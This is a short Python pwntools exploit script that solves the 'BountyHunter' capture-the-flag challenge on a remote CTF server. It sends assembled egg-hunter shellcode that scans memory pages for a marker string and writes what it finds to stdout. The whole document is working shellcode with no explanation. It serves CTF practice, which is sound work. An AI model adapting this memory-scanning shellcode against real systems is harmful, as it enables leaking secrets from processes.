#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./BountyHunter")
context.binary = exe

#io = gdb.debug(exe.path, 'b* main+0xb4\nc\nsi', api=True)
#io = remote('127.0.0.1', 5000)
io = remote('pwn.1nf1n1ty.team', 31681)

hunter = '''
init:
    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi
    mov ebx, 0x6e6f7269
    
find:
    add rdi, 0x1000
    mov rax, 21
    syscall

    cmp al, 0xf2
    jz find

    cmp [rdi], ebx
    jne find

    mov rax, 1
    mov rsi, rdi 
    mov rdi, 1
    mov rdx, 60       
    syscall   
'''

io.sendlineafter(b'>> ', asm(hunter))
io.interactive()
